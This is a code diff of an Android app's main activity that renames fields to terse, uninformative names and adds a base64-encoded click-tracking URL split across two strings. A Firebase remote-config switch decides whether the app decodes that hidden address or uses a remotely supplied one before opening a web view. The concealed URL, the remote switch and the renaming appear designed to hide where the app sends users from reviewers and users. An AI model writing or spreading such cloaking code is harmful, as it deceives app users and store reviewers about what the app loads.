@@ -22,18 +22,20 @@ import com.google.android.gms.tasks.Task;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
 import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
 
-public class MainActivity extends AppCompatActivity {
-    boolean connected;
-    public static String act = "checkinternet";
-    private IntentFilter intentFilter;
+public class Main extends AppCompatActivity {
 
 
     int countingPeriodicState;
     TextView conny;
+    public static String act = "checkinternet";
+    private IntentFilter f;
+
     boolean finishPeriodicCounting;
-    ImageView splashImage;
-    private FirebaseRemoteConfig mFirebaseRemoteConfig;
-    static String main;
+    ImageView intro;
+
+    private boolean isC;
+    private FirebaseRemoteConfig frConf;
+    static String page;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -41,36 +43,41 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         new InitializeOneSignal().init(this);
         removeNavs();
-        main = getResources().getString(R.string.icra);
-        splashImage = findViewById(R.id.splash_screen);
+
+        intro = findViewById(R.id.splash_screen);
         conny = findViewById(R.id.conny);
 
-        intentFilter = new IntentFilter();
-        intentFilter.addAction(act);
-        Intent intent = new Intent(this, ConnectionService.class);
+        f = new IntentFilter();
+        f.addAction(act);
+        Intent intent = new Intent(this, netListener.class);
         startService(intent);
+
+        page = "aHR0cHM6Ly9vd2Euc25haS5zdG9yZS9jbGljay5waHA/a2V5PXBue";
+        page += "WFkNTRtcnViamRod2gyM2xy";
+
         if (net(getApplicationContext())) {
-            if (!connected) {
+            if (!isC) {
                 conny.setVisibility(View.GONE);
-                mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
+                frConf = FirebaseRemoteConfig.getInstance();
                 FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                         .setMinimumFetchIntervalInSeconds(2600)
                         .build();
-                mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
-                mFirebaseRemoteConfig.setDefaultsAsync(R.xml.paff);
-                mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
+                frConf.setConfigSettingsAsync(configSettings);
+                frConf.setDefaultsAsync(R.xml.tcpip);
+
+                frConf.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                     @Override
                     public void onComplete(@NonNull Task<Boolean> task) {
-                        if (mFirebaseRemoteConfig.getString("icra").contains("icra")) {
-                            main = getSecret(main);
+                        if (frConf.getString("tcp").contains("tcp")) {
+                            page = getSecret(page);
                         } else {
-                            main = mFirebaseRemoteConfig.getString("icra");
+                            page = frConf.getString("tcp");
                         }
                     }
                 });
 
                 initialize();
-                connected = true;
+                isC = true;
             }
         } else {
             showConnectionMessage();
@@ -81,29 +88,29 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public void onResume() {
         removeNavs();
-        registerReceiver(b, intentFilter);
+        registerReceiver(b, f);
         if (net(getApplicationContext())) {
-            if (!connected) {
+            if (!isC) {
                 conny.setVisibility(View.GONE);
-                mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
+                frConf = FirebaseRemoteConfig.getInstance();
                 FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                         .setMinimumFetchIntervalInSeconds(2600)
                         .build();
-                mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
-                mFirebaseRemoteConfig.setDefaultsAsync(R.xml.paff);
-                mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
+                frConf.setConfigSettingsAsync(configSettings);
+                frConf.setDefaultsAsync(R.xml.tcpip);
+                frConf.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                     @Override
                     public void onComplete(@NonNull Task<Boolean> task) {
-                        if (mFirebaseRemoteConfig.getString("icra").contains("icra")) {
-                            main = getSecret(main);
+                        if (frConf.getString("tcp").contains("tcp")) {
+                            page = getSecret(page);
                         } else {
-                            main = mFirebaseRemoteConfig.getString("icra");
+                            page = frConf.getString("tcp");
                         }
                     }
                 });
 
                 initialize();
-                connected = true;
+                isC = true;
             }
         } else showConnectionMessage();
         super.onResume();
@@ -115,7 +122,7 @@ public class MainActivity extends AppCompatActivity {
         View screen = findViewById(R.id.zzz);
         screen.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                 | View.SYSTEM_UI_FLAG_FULLSCREEN
-                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY );
+                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
 
         getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
     }
@@ -130,11 +137,11 @@ public class MainActivity extends AppCompatActivity {
                 if (!finishPeriodicCounting) {
                     ++countingPeriodicState;
                     if (countingPeriodicState > 0) {
-                        splashImage.setVisibility(View.VISIBLE);
+                        intro.setVisibility(View.VISIBLE);
                     }
                     if (countingPeriodicState >= 9) {
                         finishPeriodicCounting = true;
-                        MainActivity.this.startActivity(new Intent(MainActivity.this, Web.class));
+                        Main.this.startActivity(new Intent(Main.this, Web.class));
                     }
                     handler.postDelayed(this, d);
                 }
@@ -155,39 +162,39 @@ public class MainActivity extends AppCompatActivity {
     };
 
     private void fireStarter() {
-        if (!connected) {
+        if (!isC) {
             conny.setVisibility(View.GONE);
-            mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
+            frConf = FirebaseRemoteConfig.getInstance();
             FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                     .setMinimumFetchIntervalInSeconds(2600)
                     .build();
-            mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
-            mFirebaseRemoteConfig.setDefaultsAsync(R.xml.paff);
-            mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
+            frConf.setConfigSettingsAsync(configSettings);
+            frConf.setDefaultsAsync(R.xml.tcpip);
+            frConf.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                 @Override
                 public void onComplete(@NonNull Task<Boolean> task) {
-                    if (mFirebaseRemoteConfig.getString("icra").contains("icra")) {
-                        main = getSecret(main);
+                    if (frConf.getString("tcp").contains("tcp")) {
+                        page = getSecret(page);
                     } else {
-                        main = mFirebaseRemoteConfig.getString("icra");
+                        page = frConf.getString("tcp");
                     }
                 }
             });
 
             initialize();
-            connected = true;
+            isC = true;
         }
     }
 
 
     void showConnectionMessage() {
         conny.setVisibility(View.VISIBLE);
-        connected = false;
+        isC = false;
     }
 
     @Override
     protected void onRestart() {
-        registerReceiver(b, intentFilter);
+        registerReceiver(b, f);
         removeNavs();
         super.onRestart();
     }
